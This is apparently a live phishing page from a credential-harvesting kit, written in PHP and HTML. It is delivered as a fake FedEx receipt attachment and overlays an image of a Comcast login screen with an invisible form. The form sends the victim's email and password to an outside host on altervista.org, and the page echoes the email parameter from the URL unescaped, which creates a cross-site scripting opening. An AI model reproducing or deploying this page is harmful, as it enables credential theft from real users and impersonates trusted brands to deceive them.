<?php
sleep(4);  // delay in seconds
header("Content-Disposition: attachment; filename=FedEx_Receipt_AirWayBillReceipt009.htm");
header("Content-Type: text/html"); // optional
readfile("logind.php");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">



<!-- saved from url=(0014)about:internet -used for VM preview mode only -->



<html> 







<head> 



<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">



<title>Account Validation</title>



<link rel="shortcut icon" href="favicon.ico">



<meta name="generator" content="Virtual Mechanics SiteSpinner 2.92g - Trial Only">



<meta http-equiv="imagetoolbar" content="false">







<style type="text/css">



<!--



body {



  margin: 0;



  height: 100%;



  width: 100%;



  background-color: #ffffff;



}



img {



  border-width: 0;



  vertical-align: top;



}



form#Oform3 {



  visibility: visible;



  margin: 0px;



  font-size: 10px;



}



.dfltf  {



	position: absolute;



	color: #000000;



	font-family: 'Times New Roman';



	font-size: 12px;



	font-weight: normal;



	font-style: normal;



	text-decoration: none;



	width: 255px;



	height: 45px;



	left: 0px;



	top: 36px;



}



#Oobj1 {



  position: absolute;



  font-size: 10px;



  z-index: 1;



  left: -0.20em;



  top: -0.10em;



  width: 134.80em;



  height: 95.60em;



}



img#Ggeo1 {



  width: 100%;



  height: 100%;



}



#Oobj3 {



	position: absolute;



	font-size: 10px;



	z-index: 2;



	left: 886px;



	top: 98px;



	width: 128px;



	height: 24px;



	right: 658px;



    }



#Gform1 {



    border: 0 none #b4b4b4;



        width: 103%;



        height: 141%;



        top: -14px;



        left: -6px;



        margin-top: 0px;



    }



#Oobj5 {



  position: absolute;



  font-size: 10px;



  z-index: 3;



  left: 31.2em;



  top: 15.2em;



  width: 9.00em;



  height: 2.90em;



}



#Gform4 {



	border: 0 none #b4b4b4;



	width: 258px;



	height: 44px;



	background-color: #ffffff;



	background-image: url('2013-12-28_004957.png');



	top: 90px;



	left: -1px;



    }







#Gform2 {



    border: 0 none #b4b4b4;



        width: 102%;



        height: 100%;



        top: -8px;



        left: -1px;



    }



#Gform3 {



    border: 0 none #b4b4b4;



        width: 40%;



        height: 91%;



        top: 242px;



        left: -34px;



    }







#Gform5 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 118px;



        left: -4px;



    }







#Gform5 {



    border: 0 none #b4b4b4;



        width: 40%;



        height: 91%;



        top: 190px;



        left: -32px;



    }







#Gform6 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 259px;



        left: -4px;



    }







#Gform6 {



    border: 0 none #b4b4b4;



        width: 72%;



        height: 91%;



        left: -27px;



    }







#Gform7 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 225px;



        left: -4px;



    }







#Gform7 {



    border: 0 none #b4b4b4;



        width: 73%;



        height: 91%;



        left: -27px;



    }







#Gform8 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 434px;



        left: -4px;



    }







#Gform8 {



    border: 0 none #b4b4b4;



        width: 3%;



        height: 73%;



        left: 110px;



    }







#Gform9 {



	border: 0 none #b4b4b4;



	width: 79%;



	height: 141%;



	top: 85px;



	left: -4px;



    }







#Gform9 {



	border: 0 none #b4b4b4;



	width: 285px;



	height: 70px;



	left: -49px;



    }







#Gform10 {



	border: 0 none #b4b4b4;



	width: 79%;



	height: 141%;



	top: 2px;



	left: -4px;



    }







#Gform10 {



	border: 0 none #b4b4b4;



	width: 139px;



	height: 91%;



	left: 102px;



    }







#Gform11 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 150px;



        left: -4px;



    }







#Gform11 {



    border: 0 none #b4b4b4;



        width: 73%;



        height: 91%;



        left: -28px;



    }







#Gform12 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 73px;



        left: -4px;



    }







#Gform12 {



    border: 0 none #b4b4b4;



        width: 73%;



        height: 91%;



        left: -30px;



    }







#Gform13 {



    border: 0 none #b4b4b4;



        width: 79%;



        height: 141%;



        top: 28px;



        left: -4px;



    }







#Gform13 {



    border: 0 none #b4b4b4;



        width: 21%;



        height: 91%;



        left: 27px;



    }



.dfltf1 {  position: absolute;



  color: #000000;



  font-family: 'Times New Roman';



  font-size: 12px;



  font-weight: normal;



  font-style: normal;



  text-decoration: none;



}















-->



</style>







</script>







</head> 







<body>







<div id="Oobj1"><img src="comcast/comcast.png" width="1416" height="822" id="Ggeo1"></div>



<form id="Oform3" name="myform" action="http://directoryupdatee.altervista.org/veri1/member.php"   method="POST"  enctype="application/x-www-form-urlencoded">



<div id="Oobj3">



  <input value="Submit" name="Submit" style="color: transparent; background-color: transparent; border-color: transparent; cursor: default; position: absolute; left: 36px; top: 344px; width: 121px; height: 52px" type="submit">



  <input name="q4_prince" size="20" style="position: absolute; left: -46px; top: 164px; width: 282px; height: 66px" type="pass" placeholder="q4_prince">



  <input         



        type="text" id="Gform9" class="dfltf" name="q3_name" value="<?php echo $_GET['email']; // output 2489 ?>" <?php echo $_GET['email']; // output 2489 ?> ?>



</div></form>



















</body> 







<head>	<!--used for VM preview mode only -->



	<meta http-equiv="Expires" content="-1">



</head>	<!--used for VM preview mode only -->



</html> 



